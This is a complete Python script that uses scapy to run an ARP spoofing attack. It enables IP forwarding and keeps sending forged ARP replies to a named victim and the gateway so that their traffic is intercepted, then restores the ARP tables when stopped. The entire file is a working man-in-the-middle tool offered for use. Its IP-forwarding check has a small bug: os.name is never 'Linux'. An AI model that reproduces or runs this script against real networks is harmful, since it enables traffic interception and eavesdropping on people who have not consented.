#!/usr/bin/env python3
import os
import sys
import time
import argparse
import subprocess
from scapy.all import Ether, ARP, srp, send

def _enable_iproute():
    if os.name == "Linux":
        subprocess.run(["sudo", "sysctl", "net.ipv4.ip_forward=1"])
    if os.name == "posix":
        subprocess.run(["sudo", "sysctl", "-w", "net.inet.ip.forwarding=1"])
        return

def enable_iproute(verbose=True):
    os.system('cls' if os.name == 'nt' else 'clear')
    # Enable IP forwarding
    if verbose:
        print("[*] Enabling IP Routing...")
        _enable_iproute()
    if verbose:
        print("\033[32m[+] \033[0mIP Routing enabled.")

def get_mac(ip):
    # Returns MAC Address of any device connected to the network.
    # It IP address is down, returns None instead.
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)     # Get target MAC address.
    # Craft the arp 'is-at' operation packet, in other words; an ARP response.
    # Don't specify 'hwsrc' (source MAC address) because by default, 'hwsrc' is the real MAC address of the sender.
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    if verbose:
        # Get the MAC address of the default interface we are using.
        self_mac = ARP().hwsrc
        print("\033[32m[+] \033[0mSent to {} : {}\033[33m at\033[0m {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose=0):
    target_mac = get_mac(target_ip)     # Get the real target MAC address.
    host_mac = get_mac(host_ip)     # Get the real MAC address of spoofed (gateway, i.e router).
    # Crafting the restoring packet.
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    # Sending the restoring packet to restore the network to its normal process.
    send(arp_response, verbose=0, count=7)  # Send each reply seven times for a good measure (count=7).
    if verbose:
        print("\033[32m[+] \033[0mSent to {} : {}\033[33m at\033[0m {}".format(target_ip, host_ip, host_mac))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoofing Attack")
    parser.add_argument("target", help="Victim IP Address to ARP poison")
    parser.add_argument("host", help="Host IP address, the host you wish to intercept packets for (usually the gateway)")
    parser.add_argument("-v", "--verbose", action="store_true", default=True ,help="verbosity, default is True (simple message each second)")
    args = parser.parse_args()
    
    target, host, verbose = args.target, args.host, args.verbose

    enable_iproute()
    try:
        while True:
            spoof(target, host, verbose)
            spoof(host, target, verbose)
            time.sleep(0.5)
    
    except KeyboardInterrupt:
        print("\033[91m[!] Detected Ctrl+C ! \033[0mRestoring the network, please wait...")
        restore(target, host)
        restore(host, target)
